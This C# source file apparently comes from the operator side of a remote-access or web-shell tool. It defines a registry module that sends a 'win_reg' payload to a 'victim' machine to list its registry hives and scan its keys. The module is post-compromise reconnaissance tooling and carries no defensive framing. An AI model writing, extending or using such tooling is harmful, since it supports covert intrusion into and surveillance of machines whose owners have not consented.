using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnReg
    {
        private clsWeb m_web { get; init; }

        public clsfnReg(clsWeb web)
        {
            m_web = web;
        }

        public class clsRegistryValue
        {
            [JsonProperty("name")]
            public string Name { get; set; }

            [JsonProperty("Type")]
            public string Type { get; set; }

            [JsonProperty("data")]
            public byte[] Data { get; set; }
        }

        public class clsRegistryQueryResult
        {
            [JsonProperty("subkeys")]
            public List<string> Subkeys { get; set; }

            [JsonProperty("values")]
            public List<clsRegistryValue> Values { get; set; }
        }

        public async Task<Dictionary<string, bool>> fnHives()
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "hive", m_web.m_victim.ShellEncoding });
            var result = JsonConvert.DeserializeObject<Dictionary<string, bool>>(szResp);

            if (result == null)
                return new Dictionary<string, bool>();

            return result;
        }

        public async Task<clsRegistryQueryResult?> fnScan(string szBasePath)
        {
            string szResp = await m_web.fnszSendPayload("win_reg", new string[] { "hive", m_web.m_victim.ShellEncoding, szBasePath });
            var result = JsonConvert.DeserializeObject<clsRegistryQueryResult>(szResp);

            if (result == null)
                return null;

            return result;
        }
    }
}
